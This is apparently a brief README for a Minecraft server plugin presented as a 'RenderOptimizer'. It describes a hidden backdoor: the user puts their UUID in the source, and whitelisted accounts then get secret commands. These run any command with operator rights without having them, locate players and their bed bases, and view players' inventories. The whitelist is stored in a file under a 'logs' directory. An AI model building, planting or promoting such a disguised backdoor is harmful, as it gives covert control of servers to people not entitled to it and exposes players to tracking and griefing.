tbh this readme will be low quality as im only postin this since someone requested it
when u download go to `src\main\java\org\CubeCraftBreakdownXYZ\renderoptimizer\RenderOptimizer.java` and go to line 40 and put your UUID there

commands:

/uuid [UUID] this is to whitelist another uuid, e.g. /test 069a79f4-44e9-4726-a5be-fca90e38aaf5
^ this will also add the uuid to a whitelist file aka you dont need to run this again unless the "logs" directory gets reset
/silent [CMD] silently runs a command with op status even if u dont have it, e.g. /silent kill Notch
/pos [PLAYER] gets the coordinates to a player and the dimension they r in (nether, end, overworld), e.g. /pos Notch
/base [PLAYER] same shit as above except it gets their bed location, essentially a base finder, e.g. /base Notch
/inv [PLAYER] just lets u see a players inventory, armor, etc, e.g. /inv Notch
